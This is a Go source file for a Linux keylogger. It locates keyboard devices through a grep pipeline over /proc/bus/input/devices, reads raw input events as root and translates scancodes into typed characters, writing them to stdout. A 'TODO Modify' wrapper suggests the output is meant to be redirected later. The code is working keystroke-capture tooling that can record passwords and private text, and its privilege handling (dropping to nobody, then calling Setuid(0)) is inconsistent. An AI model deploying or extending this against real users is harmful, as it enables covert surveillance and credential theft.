package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"os/exec"
	"syscall"
)

type timestamp struct {
	seconds  uint64
	microsec uint64
}

type inputEvent struct {
	timestamp timestamp
	etype     uint16
	code      uint16
	value     int32
}

var (
	charKeys  = "1234567890-=qwertyuiop[]asdfghjkl;'`\\zxcvbnm,./<"
	shiftKeys = `!@#$%^&*()_+QWERTYUIOP{}ASDFGHJKL:"~|ZXCVBNM<>?>`
	altgrKeys = ""

	funcKeys = []string{"<Esc>", "<BckSp>", "<Tab>", "<Enter>", "<LCtrl>", "<LShft>", "<RShft>", "<KP*>", "<LAlt>",
		" ", "<CpsLk>", "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>", "<NumLk>",
		"<ScrLk>", "<KP7>", "<KP8>", "<KP9>", "<KP->", "<KP4>", "<KP5>", "<KP6>", "<KP+>", "<KP1>", "<KP2>", "<KP3>",
		"<KP0>", "<KP.>", "<F11>", "<F12>", "<KPEnt>", "<RCtrl>", "<KP/>", "<PrtSc>", "<AltGr>", "<Break>", "<Home>",
		"<Up>", "<PgUp>", "<Left>", "<Right>", "<End>", "<Down>", "<PgDn>", "<Ins>", "<Del>", "<Pause>", "<LMeta>",
		"<RMeta>", "<Menu>"}

	charOrFunc = "_fccccccccccccffccccccccccccffccccccccccccfcccccccccccffffffffffffffffffffffffffffff__cff_______ffffffffffffffff_______f_____fff"
)

const (
	Key1          = 2
	KeyEqual      = 13
	KeyQ          = 16
	KeyRightbrace = 27
	KeyA          = 30
	KeyGrave      = 41
	KeyBackslash  = 43
	KeySlash      = 53
	KeyEsc        = 1
	KeyBackspace  = 14
	KeyTab        = 15
	KeyEnter      = 28
	KeyLeftCtrl   = 29
	KeyLeftShift  = 42
	KeyRightShift = 54
	KeyLeftAlt    = 56
	KeySpace      = 57
	KeyKPDot      = 83
	KeyF11        = 87
	KeyF12        = 88
	KeyKPEnter    = 96
	KeyRightCtrl  = 97
	KeyRightAlt   = 100
	KeyDelete     = 111
	KeyPause      = 119
	KeyLeftMeta   = 125
	KeyCompose    = 127
	// ExeGrep is the path to grep
	ExeGrep = "/bin/grep"
	// DumpDevices is the command line to parse /proc/bus/input/devices for keyboard event handlers
	DumpDevices = ExeGrep + " -E 'Handlers|EV=' /proc/bus/input/devices | " + ExeGrep + " -B1 'EV=120013' | " + ExeGrep + " -Eo 'event[0-9]+'"
)

// parses through the /proc/bus/input/devices file for keyboard devices.  I pulled
// the DumpDevices command line straight from github.com/kernc/logkeys/logkeys.cc,
// with minor modification.
func dumpDevices() []string {
	cmd := exec.Command("/bin/sh", "-c", DumpDevices)

	output, err := cmd.Output()
	if err != nil {
		log.Println("unable to enumerate input devices: ", output, err)
		return []string{}
	}

	buf := bytes.NewBuffer(output)

	var devices []string

	for line, err := buf.ReadString('\n'); err == nil; {
		devices = append(devices, "/dev/input/"+line[:len(line)-1])

		line, err = buf.ReadString('\n')
	}

	return devices
}

func isCharKey(ch uint) bool {
	if ch >= uint(len(charOrFunc)) {
		log.Println("CharKey out of bounds: ", ch)
		return false
	}

	return charOrFunc[ch] == 'c'
}

func isFuncKey(ch uint) bool {
	if ch >= uint(len(charOrFunc)) {
		log.Println("FuncKey out of bounds: ", ch)
		return false
	}

	return charOrFunc[ch] == 'f'
}

func isUsedKey(ch uint) bool {
	if ch >= uint(len(charOrFunc)) {
		log.Println("UsedKey out of bounds: ", ch)
		return false
	}

	return charOrFunc[ch] != '_'
}

func toCharKeysIndex(keycode int) int {
	switch {
	case keycode >= Key1 && keycode <= KeyEqual: // keycodes 2 - 13
		return keycode - 2
	case keycode >= KeyQ && keycode <= KeyRightbrace: // keycodes 16 - 27
		return keycode - 4
	case keycode >= KeyA && keycode <= KeyGrave: // keycodes 30 - 41
		return keycode - 6
	case keycode >= KeyBackslash && keycode <= KeySlash: // keycodes 43 - 53
		return keycode - 7
	}

	return -1
}

func toFuncKeysIndex(keycode int) int {
	switch {
	case keycode == KeyEsc: // 1
		return 0
	case KeyBackspace <= keycode && keycode <= KeyTab: // 14 - 15
		return keycode - 13
	case KeyEnter <= keycode && keycode <= KeyLeftCtrl: // 28 - 29
		return keycode - 25
	case keycode == KeyLeftShift: // 42
		return keycode - 37
	case KeyRightShift <= keycode && keycode <= KeyKPDot: // 54 - 83
		return keycode - 48
	case KeyF11 <= keycode && keycode <= KeyF12: // 87 - 88
		return keycode - 51
	case KeyKPEnter <= keycode && keycode <= KeyDelete: // 96 - 111
		return keycode - 58
	case keycode == KeyPause: // 119
		return keycode - 65
	case KeyLeftMeta <= keycode && keycode <= KeyCompose: // 125 - 127
		return keycode - 70
	}

	return -1
}

// helper function to open the input device
func openInputFD(path string) (*os.File, error) {
	input, err := os.OpenFile(path, os.O_RDONLY, 0600)
	if err != nil {
		return nil, err
	}

	return input, nil
}

// our goroutine for handling input events on disk
func processInputEvent(events chan inputEvent, done chan struct{}, inputFile *os.File) {
	var event inputEvent
	var buffer = make([]byte, 24)

	for {
		// read the input events as they come in
		n, err := inputFile.Read(buffer)
		if err != nil {
			return
		}

		if n != 24 {
			log.Println("Wierd Input Event Size: ", n)
			continue
		}

		// parse the input event according to the <linux/input.h> header struct
		event.timestamp.seconds = binary.LittleEndian.Uint64(buffer[0:8])
		event.timestamp.microsec = binary.LittleEndian.Uint64(buffer[8:16])
		event.etype = binary.LittleEndian.Uint16(buffer[16:18])
		event.code = binary.LittleEndian.Uint16(buffer[18:20])
		event.value = int32(binary.LittleEndian.Uint32(buffer[20:24]))

		// check if we've been signaled to quit
		select {
		case <-done:
			return
		case events <- event:
		}
	}
}

const (
	// EvMake is when a key is pressed
	EvMake = 1
	// EvBreak is when a key is release
	EvBreak = 0
	// EvRepeat is when key switches to repeating
	EvRepeat = 2
)

func keyLogger() {
	LogKeys(os.Stdout) // TODO Modify
}

// LogKeys is the all-encapsulated function for logging keystrokes in Linux
// with root privileges.
// 			Example usage: .
func LogKeys(out *os.File) {
	// our communication channels for the input event goroutine
	events := make(chan inputEvent, 1)
	done := make(chan struct{})

	// drop privileges when executing other programs
	syscall.Setgid(65534)
	syscall.Setuid(65534)

	// dump our keyboard devices from /proc/bus/input/devices
	devices := dumpDevices()
	if len(devices) == 0 {
		log.Fatal("no input devices found")
	}

	// bring back our root privs
	syscall.Setgid(0)
	syscall.Setuid(0)

	// open the first device found for reading
	input, err := openInputFD(devices[0])
	if err != nil {
		log.Fatal(err)
	}
	defer input.Close()
	defer close(done)

	// spawn the input event goroutine
	go processInputEvent(events, done, input)

	// process events as they come in
	var scanCode, prevCode uint
	var shiftDown, ctrlDown, altDown bool
	var countRepeats int

	_ = ctrlDown
	_ = altDown

	for evnt := range events {

		// Keyboard events are always type 1
		if evnt.etype != 1 {
			continue
		}

		// grab the scan code of the event (needs to be converted to fit into our array)
		scanCode = uint(evnt.code)
		if scanCode >= uint(len(charOrFunc)) {
			log.Println("ScanCode outside of range: ", scanCode)
			continue
		}

		// if this is a repeating key event
		if evnt.value == EvRepeat {
			countRepeats++

		} else if countRepeats > 0 {
			// otherwise, print out how many times it repeated
			if prevCode == KeyRightShift || prevCode == KeyLeftCtrl || prevCode == KeyRightAlt || prevCode == KeyLeftAlt || prevCode == KeyLeftShift || prevCode == KeyRightCtrl {
			} else {
				fmt.Fprintf(out, "<#+%d>", countRepeats)
			}
			countRepeats = 0
		}

		// if this is a KeyDown event
		if evnt.value == EvMake {
			// check all the modifier keys
			if scanCode == KeyLeftShift || scanCode == KeyRightShift {
				shiftDown = true
			}
			if scanCode == KeyRightAlt {
				altDown = true
			}
			if scanCode == KeyLeftCtrl || scanCode == KeyRightCtrl {
				ctrlDown = true
			}

			var key byte

			// if this is an printable character
			if isCharKey(scanCode) {
				if shiftDown == true {
					key = shiftKeys[toCharKeysIndex(int(scanCode))]
					if key == 0 {
						key = charKeys[toCharKeysIndex(int(scanCode))]
					}
				} else {
					key = charKeys[toCharKeysIndex(int(scanCode))]
				}

				// now print it out
				if key != 0 {
					fmt.Fprintf(out, "%1c", key)
				}
			} else if isFuncKey(scanCode) {
				// if this is a function key (check keytables.go for definition)
				if key == KeySpace || key == KeyTab {
					fmt.Fprintf(out, " ")
				} else {
					// print out the function string
					fmt.Fprintf(out, "%1s", funcKeys[toFuncKeysIndex(int(scanCode))])
				}
			} else {
				// we don't know the scancode, print an error
				fmt.Fprintf(out, "<E-%x>", scanCode)
			}
		}

		// if this is a KeyUp event
		if evnt.value == EvBreak {
			// we only care if its a modifier key
			if scanCode == KeyLeftShift || scanCode == KeyRightShift {
				shiftDown = false
			}
			if scanCode == KeyRightAlt {
				altDown = false
			}
			if scanCode == KeyLeftCtrl || scanCode == KeyRightCtrl {
				ctrlDown = false
			}
		}
	}
}
